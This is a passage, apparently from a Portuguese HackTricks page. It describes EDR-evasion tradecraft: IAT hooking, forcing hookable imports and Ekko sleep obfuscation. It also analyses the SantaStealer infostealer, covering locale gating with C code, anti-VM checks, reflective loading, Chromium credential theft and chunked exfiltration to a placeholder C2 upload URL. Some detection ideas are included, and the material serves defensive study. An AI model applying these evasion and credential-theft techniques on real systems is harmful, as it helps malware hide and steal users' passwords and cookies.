- Em `_GetProcAddress`, pule imports por ordinal e use uma lookup de hook baseada em hash como `__resolve_hook(ror13hash(name))`. Se existir um hook, retorne-o; caso contrário delegate ao GetProcAddress real.
- Registre alvos de hook em link time com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook permanece válido porque vive dentro do resident PICO.

Isso gera **redirecionamento de IAT em tempo de importação** sem patchar a seção de código da DLL carregada após o load.

### Forçando imports hookable quando o alvo usa PEB-walking

Import-time hooks só disparam se a função estiver realmente na IAT do alvo. Se um módulo resolve APIs via PEB-walk + hash (sem entrada de import), force um import real para que o caminho `ProcessImports()` do loader o detecte:

- Substitua a resolução de export por hash (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emitirá uma entrada na IAT, permitindo interceptação quando o reflective loader resolver imports.

### Ekko-style sleep/idle obfuscation sem patchar `Sleep()`

Ao invés de patchar `Sleep`, hook as primitivas reais de wait/IPC que o implant usa (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas longas, envolva a chamada em uma cadeia de ofuscação estilo Ekko que encripta a imagem em memória durante o idle:

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamem `NtContinue` com `CONTEXT` frames forjados.
- Cadeia típica (x64): setar a imagem para `PAGE_READWRITE` → encriptar com RC4 via `advapi32!SystemFunction032` sobre a imagem mapeada inteira → realizar a wait bloqueante → decriptar RC4 → **restaurar permissões por seção** caminhando pelas seções PE → sinalizar conclusão.
- `RtlCaptureContext` fornece um template de `CONTEXT`; clone-o em múltiplos frames e ajuste registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada passo.

Detalhe operacional: retorne “success” para waits longos (e.g., `WAIT_OBJECT_0`) para que o caller continue enquanto a imagem está mascarada. Esse padrão esconde o módulo de scanners durante janelas de idle e evita a assinatura clássica de “Sleep() patched”.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- `advapi32!SystemFunction032` usado em buffers grandes do tamanho de imagem contíguos.
- `VirtualProtect` em grande faixa seguido por restauração custom da permissão por seção.


## SantaStealer Tradecraft para Evasão Fileless e Roubo de Credenciais

SantaStealer (aka BluelineStealer) ilustra como info-stealers modernos mesclam AV bypass, anti-analysis e acesso a credenciais em um único fluxo de trabalho.

### Keyboard layout gating & sandbox delay

- Uma flag de config (`anti_cis`) enumera layouts de teclado instalados via `GetKeyboardLayoutList`. Se for encontrado um layout cirílico, a amostra grava um marcador vazio `CIS` e termina antes de rodar os stealers, garantindo que nunca detone em localidades excluídas enquanto deixa um artefato de hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas `check_antivm`

- Variante A percorre a lista de processos, calcula o hash de cada nome com um rolling checksum customizado e compara contra blocklists embutidas para debuggers/sandboxes; repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- Variante B inspeciona propriedades do sistema (limiar de contagem de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar VirtualBox additions e realiza checagens de timing em torno de sleeps para detectar single-stepping. Qualquer detecção aborta antes do lançamento dos módulos.

### Fileless helper + double ChaCha20 reflective loading

- A DLL/EXE primária embute um Chromium credential helper que é ou dropped to disk ou manualmente mapeado in-memory; o modo fileless resolve imports/relocations por conta própria para que nenhum artefato do helper seja escrito.
- Esse helper armazena um DLL de segunda etapa cifrado duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas passagens, ele reflectively loads o blob (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- As rotinas do ChromElevator usam direct-syscall reflective process hollowing para injetar em um Chromium browser em execução, herdar AppBound Encryption keys e descriptografar senhas/cookies/cartões de crédito diretamente de bancos SQLite apesar do hardening ABE.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itera uma tabela global de ponteiros para função `memory_generators` e cria uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, browser extensions, etc.). Cada thread grava resultados em buffers compartilhados e reporta sua contagem de arquivos após uma janela de join de ~45s.
- Quando finalizado, tudo é zipado com a biblioteca estática `miniz` como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, spoofando uma boundary de browser `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, opcional `w: <campaign_tag>`, e o último chunk acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
